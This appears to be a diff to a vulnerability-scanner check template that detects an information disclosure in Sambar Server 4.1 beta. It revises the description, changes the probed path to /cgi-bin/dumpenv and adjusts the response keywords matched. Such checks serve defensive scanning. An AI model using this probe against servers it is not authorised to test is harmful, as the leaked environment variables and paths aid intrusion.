@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "检测 Sambar Server 4.1 beta 是否存在 dumpenv.pl 信息泄露漏洞，攻击者可通过 HTTP GET 请求访问该脚本获取服务器环境变量、系统路径及配置等敏感信息。"
+description = "检测 Sambar Server 4.1 beta 中 dumpenv.pl 脚本是否存在，该脚本会泄露服务器环境变量、系统路径等敏感配置信息。远程攻击者可通过 HTTP GET 请求 /cgi-bin/dumpenv 获取服务器环境变量。"
 id = "POC-AVE-1999-1377"
-name = "Sambar Server 4.1 beta dumpenv.pl 信息泄露漏洞 PoC"
+name = "Sambar Server dumpenv.pl Information Disclosure PoC"
 severity = "medium"
 tags = ["ave-1999-1377"]
 vuln_id = [
@@ -15,24 +15,15 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/dumpenv.pl"
+path = "/{{BaseURL}}/cgi-bin/dumpenv"
 protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "SERVER_NAME",
-    "SERVER_PORT",
-    "PATH",
+    "SERVER_SOFTWARE",
     "DOCUMENT_ROOT",
+    "GATEWAY_INTERFACE",
 ]
